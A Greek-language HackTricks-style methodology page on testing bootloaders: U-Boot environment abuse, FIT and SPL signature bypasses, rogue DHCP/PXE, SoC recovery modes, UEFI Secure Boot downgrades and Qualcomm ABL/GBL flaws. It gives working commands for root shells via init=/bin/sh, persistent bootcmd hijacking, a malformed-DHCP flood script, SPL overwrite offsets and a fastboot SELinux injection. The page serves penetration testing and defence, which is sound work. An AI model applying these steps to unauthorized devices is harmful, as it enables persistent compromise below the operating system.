# Δοκιμές Bootloader

{{#include ../../banners/hacktricks-training.md}}

Συνιστώνται τα παρακάτω βήματα για την τροποποίηση των ρυθμίσεων εκκίνησης συσκευών και τη δοκιμή bootloader, όπως οι U-Boot και UEFI-class loaders. Εστιάστε στην επίτευξη εκτέλεσης κώδικα στα αρχικά στάδια, στην αξιολόγηση των προστασιών υπογραφής/rollback και στην κατάχρηση των διαδρομών ανάκτησης ή εκκίνησης μέσω δικτύου.

Σχετικό: παράκαμψη του secure boot της MediaTek μέσω patching του bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Γρήγορες νίκες στο U-Boot και κατάχρηση του περιβάλλοντος

1. Πρόσβαση στο κέλυφος του interpreter
   - Κατά την εκκίνηση, πατήστε ένα γνωστό πλήκτρο διακοπής (συχνά οποιοδήποτε πλήκτρο, 0, space ή μια ειδική ακολουθία πλήκτρων της πλακέτας) πριν εκτελεστεί το `bootcmd`, για να εμφανιστεί το prompt του U-Boot.<sup>[[1]](#references)</sup>

2. Έλεγχος της κατάστασης εκκίνησης και των μεταβλητών
   - Χρήσιμες εντολές:
     - `printenv` (εμφάνιση του περιβάλλοντος)
     - `bdinfo` (πληροφορίες πλακέτας, διευθύνσεις μνήμης)
     - `help bootm; help booti; help bootz` (υποστηριζόμενες μέθοδοι εκκίνησης kernel)
     - `help ext4load; help fatload; help tftpboot` (διαθέσιμοι loaders)

3. Τροποποίηση των ορισμάτων εκκίνησης για λήψη root shell
   - Προσθέστε το `init=/bin/sh`, ώστε ο kernel να ανοίξει ένα shell αντί για το κανονικό init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Εκκίνηση μέσω δικτύου από τον TFTP server σας
   - Ρυθμίστε το δίκτυο και ανακτήστε ένα kernel/fit image από το LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Διατήρηση αλλαγών μέσω του περιβάλλοντος
   - Αν ο χώρος αποθήκευσης env δεν προστατεύεται από εγγραφή, μπορείτε να διατηρήσετε τον έλεγχο:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Ελέγξτε για μεταβλητές όπως `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` που επηρεάζουν τις διαδρομές εφεδρικής εκκίνησης. Οι εσφαλμένες τιμές μπορούν να επιτρέψουν επανειλημμένη πρόσβαση στο shell.

6. Έλεγχος λειτουργιών αποσφαλμάτωσης/μη ασφαλών λειτουργιών
   - Αναζητήστε: `bootdelay` > 0, απενεργοποιημένο `autoboot`, απεριόριστο `usb start; fatload usb 0:1 ...`, δυνατότητα χρήσης των `loady`/`loads` μέσω serial, `env import` από μη έμπιστα μέσα και kernels/ramdisks που φορτώνονται χωρίς ελέγχους υπογραφής.

7. Έλεγχος εικόνων/επαλήθευσης U-Boot
   - Αν η πλατφόρμα ισχυρίζεται ότι υποστηρίζει secure/verified boot με FIT images, δοκιμάστε τόσο unsigned όσο και παραποιημένες εικόνες:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Η απουσία των `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ή η συμπεριφορά του legacy `verify=n` συχνά επιτρέπει την εκκίνηση αυθαίρετων payloads.
   - Μην περιορίζεστε σε ένα απλό αποτέλεσμα allow/deny: πρόσφατη έρευνα για FIT έδειξε ότι και η ίδια η διαδρομή επαλήθευσης μπορεί να αποτελεί επιφάνεια pre-auth επίθεσης. Κάντε αρνητικές δοκιμές σε εξωτερικά αποθηκευμένα δεδομένα FIT (`data-offset`, `data-position`, `data-size`), στην επιλογή υπογεγραμμένων διαμορφώσεων, στα `loadables` και στον χειρισμό overlay / `extra-conf`.
   - Αν διαθέτετε αντίστοιχο source tree, το `test/vboot/vboot_test.sh` είναι ένας γρήγορος τρόπος να αναπαράγετε τη συμπεριφορά επαλήθευσης FIT στο U-Boot sandbox πριν δοκιμάσετε σε πραγματικό hardware.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` και script bootflows
   - Σε σύγχρονες εκδόσεις του U-Boot, το `bootcmd` είναι συχνά απλώς ένα wrapper γύρω από το Standard Boot. Αυτό σημαίνει ότι τα εγγράψιμα μέσα, το PXE ή η SPI flash μπορεί να αποτελούν το πραγματικό όριο εμπιστοσύνης, ακόμη κι όταν το ορατό περιβάλλον φαίνεται ακίνδυνο.
   - Το `extlinux` bootmeth αναζητά το `extlinux/extlinux.conf` στα `/` και `/boot`· το script bootmeth αναζητά πρώτα το `boot.scr.uimg` και μετά το `boot.scr`. Κατά την εκκίνηση μέσω δικτύου, το όνομα του script μπορεί να προέρχεται από το `boot_script_dhcp`.
   - Χρήσιμες εντολές για αρχική διαλογή:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Περιπτώσεις κατάχρησης προς έλεγχο: USB/SD μέσα που ελέγχει ο attacker και βρίσκονται νωρίτερα στο `boot_targets`, εγγράψιμο `/boot/extlinux/extlinux.conf`, κακόβουλος TFTP server που παρέχει `boot.scr` ή εκτέλεση script μέσω SPI με το `script_offset_f`.
   - Αν η πλατφόρμα βασίζεται σε επαλήθευση FIT, βεβαιωθείτε ότι οι διαμορφώσεις είναι υπογεγραμμένες σε επίπεδο διαμόρφωσης και όχι μόνο ανά εικόνα· το `required-mode=all` είναι ισχυρότερο από την αποδοχή οποιουδήποτε μεμονωμένου απαιτούμενου κλειδιού.

### Εξωτερικά δεδομένα FIT του SPL αντιγράφονται πριν από την επαλήθευση

Κατά τη φόρτωση FIT από SPL, μια έγκυρη υπογραφή διαμόρφωσης δεν καθιστά ασφαλή τα μεταδεδομένα εξωτερικού payload. Το U-Boot εξαιρεί τις ιδιότητες διαμόρφωσης `data-position`, `data-offset` και `data-size` από την υπογραφή. Σε επηρεαζόμενες διαδρομές `load_simple_fit()`, το SPL υπολογίζει μια θέση προέλευσης και ένα μήκος αντιγραφής από αυτά τα πεδία και έπειτα καλεί το `info->read()` **πριν** ελέγξει το hash της εικόνας. Επομένως, ένα κακόβουλα διαμορφωμένο FIT σε εγγράψιμο μέσο εκκίνησης μπορεί να αντικαταστήσει RAM χωρίς πλαστογράφηση υπογραφής. Συνήθως, η υπογεγραμμένη ιδιότητα `load` καθορίζει τη διεύθυνση προορισμού, οπότε πρώτα προσδιορίστε αν μια υπερμεγέθης αντιγραφή από αυτή τη διεύθυνση μπορεί να φτάσει στη stack ή σε άλλα δεδομένα ελέγχου.<sup>[[15]](#references)[[16]](#references)</sup>

Ακολουθήστε τον πραγματικό loader και τον χάρτη μνήμης της πλακέτας αντί να υποθέσετε ότι γίνεται ανάγνωση από flash: ο αποδεδειγμένος RAM loader έφτασε στα `spl_ram_load_read()` και `memcpy()`. Στο σημείο της κλήσης, καταγράψτε τα `fit_offset` και κάθε βασική διεύθυνση FIT που προσθέτει ο reader, το μήκος block του loader (`spl_get_bl_len(info)`), τυχόν ευθυγράμμιση ειδική για το fork, τα τελικά `read_offset` και μέγεθος μεταφοράς `size`, τον προορισμό `src_ptr` και τη θέση της αποθηκευμένης διεύθυνσης επιστροφής. Ελέγξτε αν μια συνεχόμενη αντιστοιχισμένη περιοχή προέλευσης καλύπτει την απαιτούμενη απόσταση αντιγραφής, αν επικαλύπτεται με τον προορισμό και αν τα bytes στη θέση προέλευσης μπορούν να παρέχουν έναν δείκτη προς δεδομένα FIT που ελέγχει ο attacker. Η γενική [τεχνική μερικής αντικατάστασης διεύθυνσης επιστροφής](../../binary-exploitation/stack-overflow/ret2win/) εφαρμόζεται αν ένας πλήρης δείκτης δεν μπορεί να ικανοποιήσει τους περιορισμούς ευθυγράμμισης του loader.<sup>[[16]](#references)</sup>

Στη δοκιμαστική έκδοση 32-bit AST2600 των ερευνητών, το `src_ptr` ήταν `0x80001000` και η αποθηκευμένη διεύθυνση επιστροφής της `memcpy` βρισκόταν στη θέση `0x902ffe24`. Χρησιμοποίησαν μια upstream έκδοση τροποποιημένη με τις βοηθητικές συναρτήσεις τοποθέτησης και ευθυγράμμισης της stack του OpenBMC: ο RAM reader πρόσθετε μια βασική διεύθυνση FIT `0x10000` και οι βοηθητικές συναρτήσεις έστρογγύλευαν τη θέση προέλευσης προς τα κάτω στο `ARCH_DMA_MINALIGN` (64 bytes). Ένας κατάλληλος little-endian δείκτης στη θέση `0x902fffe4` και μια αντιγραφή που τελείωνε ένα byte νωρίτερα άλλαξαν μόνο τα τρία χαμηλότερα bytes της αποθηκευμένης διεύθυνσης επιστροφής, διατηρώντας το γνωστό μηδενικό υψηλό byte. Αντίθετα, ο upstream RAM loader χρησιμοποιεί μήκος block ενός byte, επομένως αυτή η ευθυγράμμιση 64 bytes και η παράκαμψη μερικής αντικατάστασης δεν αποτελούν γενικές απαιτήσεις του SPL. Υπολογίστε ξανά τις διευθύνσεις, το μήκος block του loader και την έκταση της αντιγραφής για κάθε έκδοση. Στον αρχικό υπολογισμό παρακάτω, το `fit_offset` δηλώνει την αποτελεσματική προσθήκη βασικής διεύθυνσης FIT από τον RAM reader και όχι κατ' ανάγκη το όρισμα που δίνεται στη `load_simple_fit()`.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Η upstream διόρθωση θέτει όρια τόσο στο ακατέργαστο `data-size` όσο και στο μέγεθος μεταφοράς **ευθυγραμμισμένο σε block**, πριν από την κλήση του `info->read()`. Η διαδρομή overlay περνά την πραγματική χωρητικότητα του buffer, ενώ άλλοι callers χρησιμοποιούν το `CONFIG_SYS_BOOTM_LEN`, το οποίο αποτελεί απλώς ένα χαλαρό ανώτατο όριο και όχι απόδειξη ότι ο προορισμός διαθέτει τόσο ελεύθερη μνήμη. Κατά την αξιολόγηση ενός vendor fork, επαληθεύστε ότι υπάρχουν αυτοί οι έλεγχοι και συγκρίνετε το επιτρεπόμενο εύρος αντιγραφής με την πραγματική στοίβα SPL της πλακέτας και τις δεσμευμένες περιοχές μνήμης.<sup>[[15]](#references)[[16]](#references)</sup>

## Επιφάνεια network boot (DHCP/PXE) και rogue servers

9. Fuzzing παραμέτρων PXE/DHCP
   - Ο παλαιού τύπου χειρισμός BOOTP/DHCP του U-Boot έχει παρουσιάσει προβλήματα ασφάλειας μνήμης. Για παράδειγμα, το CVE‑2024‑42040 περιγράφει διαρροή μνήμης μέσω ειδικά διαμορφωμένων αποκρίσεων DHCP, οι οποίες μπορούν να διαρρεύσουν byte από τη μνήμη του U-Boot μέσω του δικτύου.<sup>[[4]](#references)</sup> Δοκιμάστε τις διαδρομές κώδικα DHCP/PXE με υπερβολικά μεγάλες τιμές και οριακές περιπτώσεις (όνομα αρχείου εκκίνησης option 67, vendor options, πεδία file/servername) και παρατηρήστε αν υπάρχουν κολλήματα/διαρροές.
   - Ελάχιστο απόσπασμα Scapy για stress testing παραμέτρων εκκίνησης κατά το netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Επικυρώστε επίσης αν τα πεδία ονόματος αρχείου PXE περνούν στη λογική του shell/loader χωρίς sanitization, όταν συνδέονται με scripts provision του OS.

10. Δοκιμές command injection σε rogue DHCP server
   - Ρυθμίστε μια rogue υπηρεσία DHCP/PXE και δοκιμάστε να εισαγάγετε χαρακτήρες στα πεδία ονόματος αρχείου ή options, ώστε να φτάσετε σε interpreters εντολών σε επόμενα στάδια της αλυσίδας εκκίνησης. Τα auxiliary modules DHCP του Metasploit, το `dnsmasq` ή προσαρμοσμένα scripts Scapy είναι κατάλληλα. Βεβαιωθείτε πρώτα ότι έχετε απομονώσει το δίκτυο του lab.

## Recovery modes του SoC ROM που παρακάμπτουν την κανονική εκκίνηση

Πολλά SoC παρέχουν μια λειτουργία "loader" του BootROM, η οποία δέχεται κώδικα μέσω USB/UART ακόμη κι όταν τα flash images δεν είναι έγκυρα. Αν δεν έχουν καεί τα secure-boot fuses, αυτή η λειτουργία μπορεί να παρέχει arbitrary code execution σε πολύ πρώιμο στάδιο της αλυσίδας.

- NXP i.MX (Serial Download Mode)
  - Tools: `uuu` (mfgtools3) ή `imx-usb-loader`.
  - Παράδειγμα: `imx-usb-loader u-boot.imx` για να φορτώσετε και να εκτελέσετε ένα προσαρμοσμένο U-Boot από τη RAM.
- Allwinner (FEL)
  - Tool: `sunxi-fel`.
  - Παράδειγμα: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ή `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Tool: `rkdeveloptool`.
  - Παράδειγμα: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` για να φορτώσετε έναν loader και να ανεβάσετε ένα προσαρμοσμένο U-Boot.

Ελέγξτε αν έχουν καεί τα secure-boot eFuses/OTP της συσκευής. Αν όχι, οι λειτουργίες λήψης του BootROM συχνά παρακάμπτουν κάθε επαλήθευση υψηλότερου επιπέδου (U-Boot, kernel, rootfs), εκτελώντας το payload πρώτου σταδίου απευθείας από SRAM/DRAM.

## UEFI/PC-class bootloaders: γρήγοροι έλεγχοι

11. Δοκιμές παραποίησης ESP, rollback και εγγραφής κλειδιών
   - Προσαρτήστε το EFI System Partition (ESP) και ελέγξτε για components του loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, διαδρομές λογοτύπων vendor.
   - Εξαγάγετε την κατάσταση του Secure Boot και τις βάσεις δεδομένων κλειδιών από το OS, όταν είναι δυνατό:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Αν η πλατφόρμα βρίσκεται σε Setup Mode, δέχεται εγγραφή κλειδιών χωρίς έλεγχο ταυτότητας ή διαθέτει προεπιλεγμένο/δοκιμαστικό Platform Key (κατηγορία PKfail), ένας τοπικός admin ή επιτιθέμενος με φυσική πρόσβαση μπορεί να εγγράψει το δικό του KEK/db και να διατηρήσει την εμφάνιση ότι το Secure Boot είναι «ενεργοποιημένο», ενώ εκκινεί αυθαίρετα EFI binaries.<sup>[[3]](#references)</sup>
   - Δοκιμάστε εκκίνηση με υποβαθμισμένα ή γνωστά ευάλωτα υπογεγραμμένα στοιχεία εκκίνησης, αν οι ανακλήσεις του Secure Boot (dbx) δεν είναι ενημερωμένες. Αν η πλατφόρμα εξακολουθεί να εμπιστεύεται παλιά shims/bootmanagers, συχνά μπορείτε να φορτώσετε τον δικό σας kernel ή `grub.cfg` από το ESP για να αποκτήσετε persistence.
   - Στα Windows, ενημερωμένα συστήματα μπορεί και πάλι να δέχονται ευάλωτους υπογεγραμμένους boot managers, αν ο υπογράφων `Microsoft Windows Production PCA 2011` εξακολουθεί να απουσιάζει από το firmware `dbx`, όπως παρατηρήθηκε με το BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Μια παράκαμψη τύπου Baton Drop μπορεί να εγγράψει το MOK ενός επιτιθέμενου· στη συνέχεια, ένα νόμιμο shim μπορεί να φορτώσει ένα EFI payload υπογεγραμμένο με αυτό το κλειδί σε επόμενες εκκινήσεις.<sup>[[12]](#references)[[13]](#references)</sup> Η μεταγενέστερη ανάκληση του παλιού υπογράφοντος των Windows δεν αφαιρεί το εγγεγραμμένο MOK, επομένως η διαδρομή μέσω shim μπορεί να παραμείνει ενεργή, αν αυτό το shim εξακολουθεί να θεωρείται έμπιστο.<sup>[[12]](#references)</sup>
   - Πριν δοκιμάσετε αυτή τη διαδρομή υποβάθμισης σε εξουσιοδοτημένο μηχάνημα UEFI, ελέγξτε την **πραγματική κατάσταση ανακλήσεων του firmware**, όχι μόνο το ιστορικό ενημερώσεων των Windows.<sup>[[13]](#references)[[14]](#references)</sup> Η Microsoft παρέχει αυτόν τον έλεγχο PowerShell μόνο για ανάγνωση, με αυξημένα δικαιώματα, για τον υπογράφοντα του 2011 στο `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     Το `False` είναι μόνο μια ένδειξη: επιβεβαιώστε το συγκεκριμένο υπογεγραμμένο στοιχείο εκκίνησης και τυχόν άλλες ανακλήσεις σε εργαστήριο που μπορεί να επανέλθει σε λειτουργία.<sup>[[12]](#references)[[14]](#references)</sup> Μια εκκρεμής ενημέρωση μητρώου ή ένα ληγμένο πιστοποιητικό υπογραφής δεν ισοδυναμεί με ολοκληρωμένη ανάκληση `dbx`.<sup>[[13]](#references)[[14]](#references)</sup>

12. Έλεγχος ανακλήσεων stale shim / SBAT / dbx
   - Οι παλιοί shim με υπογραφή Microsoft και τα vendor forks μπορούν ακόμη να χρησιμοποιηθούν ως διαδρομή bootkit τύπου BYOVD, αν οι ανακλήσεις είναι παρωχημένες. Σε απομονωμένο εργαστήριο, τοποθετήστε έναν ιστορικά ευάλωτο shim στο ESP και επιχειρήστε να κάνετε chainload το δικό σας `grubx64.efi` ή kernel.<sup>[[11]](#references)</sup>
   - Γρήγορη διαλογή:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Αν το shim εξακολουθεί να εκτελείται παρότι βρίσκεται στη λίστα ανάκλησης, το firmware/OS έχει παρωχημένες ενημερώσεις `dbx` ή εμπιστεύεται ένα forked loader που δεν κληρονόμησε ποτέ τις προστασίες SBAT του upstream.

13. Σφάλματα ανάλυσης λογοτύπου εκκίνησης (κατηγορία LogoFAIL)
   - Αρκετά firmware OEM/IBV ήταν ευάλωτα σε σφάλματα ανάλυσης εικόνων στο DXE, κατά την επεξεργασία λογοτύπων εκκίνησης. Αν ένας attacker μπορεί να τοποθετήσει μια ειδικά διαμορφωμένη εικόνα στο ESP, σε διαδρομή που καθορίζεται από τον κατασκευαστή (π.χ., `\EFI\<vendor>\logo\*.bmp`), και να κάνει επανεκκίνηση, ενδέχεται να είναι δυνατή η εκτέλεση κώδικα κατά την πρώιμη εκκίνηση, ακόμη και με ενεργοποιημένο το Secure Boot. Ελέγξτε αν η πλατφόρμα δέχεται λογότυπα που παρέχονται από τον χρήστη και αν αυτές οι διαδρομές είναι εγγράψιμες από το OS.<sup>[[2]](#references)</sup>


## Κενά εμπιστοσύνης Android/Qualcomm ABL + GBL (Android 16)

Σε συσκευές Android 16 που χρησιμοποιούν το ABL της Qualcomm για τη φόρτωση του **Generic Bootloader Library (GBL)**, επαληθεύστε αν το ABL **αυθεντικοποιεί** την εφαρμογή UEFI που φορτώνει από το partition `efisp`. Αν το ABL ελέγχει μόνο την **παρουσία** μιας εφαρμογής UEFI και δεν επαληθεύει τις υπογραφές, τότε μια δυνατότητα εγγραφής στο `efisp` οδηγεί σε **εκτέλεση μη υπογεγραμμένου κώδικα πριν από το OS** κατά την εκκίνηση.<sup>[[6]](#references)[[7]](#references)</sup>

Πρακτικοί έλεγχοι και τρόποι εκμετάλλευσης:

- **Δυνατότητα εγγραφής στο efisp**: Χρειάζεστε έναν τρόπο να γράψετε μια προσαρμοσμένη εφαρμογή UEFI στο `efisp` (root/προνομιούχα υπηρεσία, σφάλμα σε εφαρμογή OEM, διαδρομή recovery/fastboot). Χωρίς αυτό, το κενό στη φόρτωση του GBL δεν είναι άμεσα προσβάσιμο.<sup>[[6]](#references)</sup>
- **Έγχυση ορισμάτων fastboot OEM** (σφάλμα ABL): Ορισμένα builds δέχονται επιπλέον tokens στο `fastboot oem set-gpu-preemption` και τα προσθέτουν στη γραμμή εντολών του kernel. Αυτό μπορεί να χρησιμοποιηθεί για την επιβολή permissive SELinux, επιτρέποντας εγγραφές σε προστατευμένα partitions:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Αν η συσκευή έχει διορθωθεί, η εντολή θα πρέπει να απορρίπτει τα επιπλέον ορίσματα.<sup>[[5]](#references)[[6]](#references)</sup>
- **Ξεκλείδωμα bootloader μέσω persistent flags**: Ένα payload στο στάδιο εκκίνησης μπορεί να αλλάξει persistent flags ξεκλειδώματος (π.χ., `is_unlocked=1`, `is_unlocked_critical=1`), παρακάμπτοντας τους περιορισμούς διακομιστή/έγκρισης OEM του `fastboot oem unlock`. Αυτό αποτελεί μόνιμη αλλαγή κατάστασης μετά την επόμενη επανεκκίνηση.<sup>[[6]](#references)</sup>

Σημειώσεις άμυνας/διαλογής:

- Επιβεβαιώστε αν το ABL επαληθεύει την υπογραφή του payload GBL/UEFI από το `efisp`. Αν όχι, αντιμετωπίστε το `efisp` ως επιφάνεια persistence υψηλού κινδύνου.
- Ελέγξτε αν οι χειριστές fastboot OEM του ABL έχουν τροποποιηθεί ώστε να **επικυρώνουν τον αριθμό ορισμάτων** και να απορρίπτουν επιπλέον tokens.<sup>[[8]](#references)[[9]](#references)</sup>

## Προσοχή κατά τον χειρισμό hardware

Να είστε προσεκτικοί όταν αλληλεπιδράτε με μνήμη flash SPI/NAND κατά την πρώιμη εκκίνηση (π.χ., γειώνοντας ακίδες για παράκαμψη αναγνώσεων) και να συμβουλεύεστε πάντα το datasheet της flash. Τα βραχυκυκλώματα σε λάθος χρονική στιγμή μπορούν να καταστρέψουν τη συσκευή ή τον προγραμματιστή.

## Σημειώσεις και πρόσθετες συμβουλές

- Δοκιμάστε τις εντολές `env export -t ${loadaddr}` και `env import -t ${loadaddr}` για να μεταφέρετε blobs περιβάλλοντος μεταξύ RAM και αποθηκευτικού χώρου· ορισμένες πλατφόρμες επιτρέπουν την εισαγωγή env από αφαιρούμενα μέσα χωρίς authentication.
- Για persistence σε συστήματα Linux που εκκινούν μέσω `extlinux.conf`, συχνά αρκεί η τροποποίηση της γραμμής `APPEND` (για εισαγωγή των `init=/bin/sh` ή `rd.break`) στο διαμέρισμα εκκίνησης, όταν δεν εφαρμόζονται έλεγχοι υπογραφής.
- Αν ο στόχος χρησιμοποιεί ενημερώσεις dual-slot / A/B, εξετάστε τις τεχνικές anti-rollback και slot-desync στην [επισκόπηση ανάλυσης firmware](README.md), ώστε να μην παραβλέψετε κενά εμπιστοσύνης που αφορούν μόνο το updater, έξω από τον ίδιο τον bootloader.
- Αν το userland παρέχει `fw_printenv/fw_setenv`, επιβεβαιώστε ότι το `/etc/fw_env.config` αντιστοιχεί στην πραγματική αποθήκευση env. Οι εσφαλμένες μετατοπίσεις επιτρέπουν την ανάγνωση/εγγραφή σε λάθος περιοχή MTD.

## References

- [1] [Μεθοδολογία δοκιμών ασφάλειας firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Εντοπισμός του LogoFAIL: Οι κίνδυνοι της ανάλυσης εικόνων κατά την εκκίνηση του συστήματος](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Μη έμπιστα κλειδιά πλατφόρμας υπονομεύουν το Secure Boot στο οικοσύστημα UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Λεπτομέρειες CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Ξεκλείδωμα Xiaomi μέσω δύο μη καθαρισμένων συμβολοσειρών](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Το exploit GBL του Qualcomm Snapdragon 8 Elite επιτρέπει στους επιτιθέμενους να ξεκλειδώνουν bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Αρχιτεκτονική Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Διόρθωση της μεταφοράς μη έμπιστης εισόδου στη γραμμή εντολών του kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Προσθήκη ελέγχου για την εντολή set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Ακατάλληλο για εκκίνηση: Παράκαμψη της επαλήθευσης υπογραφής FIT του U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Σημείωση ευπάθειας VU#616257 - Bootloaders shim UEFI υπογεγραμμένοι από τη Microsoft είναι ευάλωτοι σε παράκαμψη του Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [UEFI bootkit BlackLotus: Επιβεβαιώθηκε ο μύθος](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: Ένα UEFI bootkit παρόμοιο με το BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Πώς να διαχειριστείτε τις ανακλήσεις του Windows Boot Manager για αλλαγές στο Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [Patch U-Boot: Περιορισμός του μεγέθους των εξωτερικών δεδομένων πριν από την ανάγνωσή τους](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Κρυφά beneFITs: Παράκαμψη επαλήθευσης υπογραφής στο U-Boot SPL](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
